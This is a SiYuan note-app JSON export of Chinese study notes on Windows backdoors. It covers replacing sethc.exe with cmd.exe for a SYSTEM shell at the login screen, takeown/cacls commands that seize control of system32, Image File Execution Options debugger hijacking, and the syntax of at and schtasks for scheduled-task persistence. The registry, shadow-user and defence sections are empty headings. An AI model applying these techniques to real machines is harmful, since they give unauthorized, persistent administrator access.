{"ID":"20241031094603-eh5i6qz","Spec":"1","Type":"NodeDocument","Properties":{"id":"20241031094603-eh5i6qz","title":"Windows后门","updated":"20241031110642"},"Children":[{"ID":"20241031094610-86brz0a","Type":"NodeHeading","HeadingLevel":3,"Properties":{"fold":"1","id":"20241031094610-86brz0a","updated":"20241031094638"},"Children":[{"Type":"NodeText","Data":"shift后门-老方式"}]},{"ID":"20241031094639-5v079df","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031094639-5v079df","updated":"20241031094713"},"Children":[{"Type":"NodeText","Data":"在winodws中有一些辅助功能，能在用户未登录系统之前就通过"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"组合键"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"来启动"}]},{"ID":"20241031094807-ndouq4z","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031094807-ndouq4z"}},{"ID":"20241031094807-wsurb6d","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241031094807-wsurb6d","updated":"20241031094815"},"Children":[{"Type":"NodeText","Data":"原理"}]},{"ID":"20241031094816-hfgotv6","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031094816-hfgotv6","updated":"20241031094904"},"Children":[{"Type":"NodeText","Data":"把cmd.exe这个程序更名为sethc.exe，并且把原来的sethc.exe替换掉。之后在登录界面连续按下5次shift键后，系统会以system权限运行cmd.exe。那么此时的 cmd.exe 就具有了管理权限，之后只要利用cmd增加一个管理员用户就可以登录进去，实现隐藏后门"}]},{"ID":"20241031094620-gdtqqvo","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031094620-gdtqqvo"}},{"ID":"20241031094603-q6y1fol","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241031094603-q6y1fol","updated":"20241031103106"},"Children":[{"Type":"NodeText","Data":"步骤"}]},{"ID":"20241031103108-0xbllv4","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241031103108-0xbllv4","updated":"20241031103126"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"copy C:\\WINDOWS\\system32\\cmd.exe C:\\windows\\system32\\sethc.exe   //如果没指定生成的文件，会直接覆盖copy的第二个参数，相当于将第二个参数换成了第一个参数，但是文件外部名称没变\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241031094950-b30pauv","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031094950-b30pauv","updated":"20241031103149"},"Children":[{"Type":"NodeText","Data":"在cmd窗口如果出现拒绝访问"}]},{"ID":"20241031103157-pzsspmb","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031103157-pzsspmb","updated":"20241031103421"},"Children":[{"Type":"NodeText","Data":"​​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241031103421-al7hjwr.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​​"}]},{"ID":"20241031103158-0vqluhe","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031103158-0vqluhe","updated":"20241031103214"},"Children":[{"Type":"NodeText","Data":"解决方法：需要将目录下的所有目录和文件、子目录下的所有者更改为管理员组（administrators）命令，"}]},{"ID":"20241031103204-g1kf4te","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241031103204-g1kf4te","updated":"20241031103224"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"takeown  /f  c:\\windows\\system32\\*.*  /a  /r  /d  y  # 获取整个文件夹及其下面子目录文件的所属权\ncacls c:\\windows\\system32\\*.* /T /E /G administrators:F # 将所有c:\\windows\\system32\\目录下的文件、子文件夹的NTFS权限修改为仅管理员组(administrators)完全控制(删除原有NTFS权限设置)\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241031094950-acz7wjt","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031094950-acz7wjt"}},{"ID":"20241031094950-6c2s8l6","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241031094950-6c2s8l6","updated":"20241031094957"},"Children":[{"Type":"NodeText","Data":"防御"}]},{"ID":"20241031095006-8k9vjr6","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031095006-8k9vjr6"}},{"ID":"20241031095011-8tu24ky","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031095011-8tu24ky"}},{"ID":"20241031095011-3bb0ihk","Type":"NodeHeading","HeadingLevel":3,"Properties":{"fold":"1","id":"20241031095011-3bb0ihk","updated":"20241031104142"},"Children":[{"Type":"NodeText","Data":"映像劫持"}]},{"ID":"20241031104222-nj0xgvq","Type":"NodeBlockquote","Properties":{"fold":"1","heading-fold":"1","id":"20241031104222-nj0xgvq","updated":"20241031104231"},"Children":[{"ID":"20241031104220-d0glzho","Type":"NodeParagraph","Properties":{"id":"20241031104220-d0glzho","updated":"20241031104231"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"高版本"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"的Windows版本中替换的文件受到"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"系统保护"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"，所以需要映像劫持"}]},{"Type":"NodeBlockquoteMarker","Data":"\u003e"}]},{"ID":"20241031104234-4dz3q72","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031104234-4dz3q72"}},{"ID":"20241031104235-gf5a1o5","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241031104235-gf5a1o5","updated":"20241031104237"},"Children":[{"Type":"NodeText","Data":"步骤"}]},{"ID":"20241031104239-tmk5ngg","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031104239-tmk5ngg","updated":"20241031104813"},"Children":[{"Type":"NodeText","Data":"1.在注册表的 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\lmage File Execution Option 下添加一个项 sethc.exe"}]},{"ID":"20241031104354-f4ix6a8","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241031104354-f4ix6a8","updated":"20241031105158"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"regedit\n创建osk.exe 增加值 Debugger\n数值数据修改为cmd.exe路径\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241031105747-fomnmso","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031105747-fomnmso","updated":"20241031110238"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Properties":{"parent-style":"width: 50%;","style":"width: 10000px;"},"Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241031105746-lf564gq.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"width: 10000px;\" parent-style=\"width: 50%;\"}"},{"Type":"NodeText","Data":"​"}]},{"ID":"20241031110156-4wkmrj7","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031110156-4wkmrj7","updated":"20241031110232"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Properties":{"parent-style":"width: 50%;","style":"width: 10000px;"},"Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241031110156-xfk59m6.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"width: 10000px;\" parent-style=\"width: 50%;\"}"},{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Properties":{"parent-style":"width: 50%;","style":"width: 10000px;"},"Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241031110218-bbxusvq.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"width: 10000px;\" parent-style=\"width: 50%;\"}"},{"Type":"NodeText","Data":"​​"}]},{"ID":"20241031104601-89ncftu","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241031104601-89ncftu","updated":"20241031104605"},"Children":[{"Type":"NodeText","Data":"计划任务后门"}]},{"ID":"20241031110440-qfvz891","Type":"NodeParagraph","Properties":{"id":"20241031110440-qfvz891","updated":"20241031110543"},"Children":[{"Type":"NodeText","Data":"计划任务在 "}]},{"ID":"20241031110549-7oxbxqr","Type":"NodeParagraph","Properties":{"id":"20241031110549-7oxbxqr","updated":"20241031110559"},"Children":[{"Type":"NodeText","Data":"Windows7 及之前--》 at 命令"}]},{"ID":"20241031110543-nwgh1h7","Type":"NodeParagraph","Properties":{"id":"20241031110543-nwgh1h7","updated":"20241031110618"},"Children":[{"Type":"NodeText","Data":"Windows8 等高版本--》 schtasks 命令"}]},{"ID":"20241031110620-t8tj4he","Type":"NodeParagraph","Properties":{"id":"20241031110620-t8tj4he"},"Children":[{"Type":"NodeText","Data":"\nat命令是只会打开一个后台进程，而schtasks命令是将定时的任务在前台执行\nat命令的参数:\nAT [\\computername] time [/INTERACTIVE]\n[/EVERY:datel,..] /NEXT:date.,...]] \"command\"\nschtasks命令的参数\nschtasks /create /tn TaskName /tr TaskRun /sc schedule [/mo modifier] [/d day] [/m\nmonth[,month.] [/i ldleTime] [/st StartTime] [/sd StartDate] /ed EndDate] [/s computer [/u\n[domain]user /p password]] [/ru {[Domain]User \"System\"} [/rp Password]] /?"}]},{"ID":"20241031110504-2j4b21s","Type":"NodeParagraph","Properties":{"id":"20241031110504-2j4b21s"}},{"ID":"20241031110505-s1eb8un","Type":"NodeParagraph","Properties":{"id":"20241031110505-s1eb8un","updated":"20241031110534"},"Children":[{"Type":"NodeText","Data":"创建后门的基本命令"}]},{"ID":"20241031110637-iqkvl4i","Type":"NodeParagraph","Properties":{"id":"20241031110637-iqkvl4i"}},{"ID":"20241031110639-u0ua5du","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241031110639-u0ua5du","updated":"20241031110642"},"Children":[{"Type":"NodeText","Data":"注册表"}]},{"ID":"20241031104608-y9108xp","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241031104608-y9108xp","updated":"20241031104612"},"Children":[{"Type":"NodeText","Data":"影子用户"}]}]}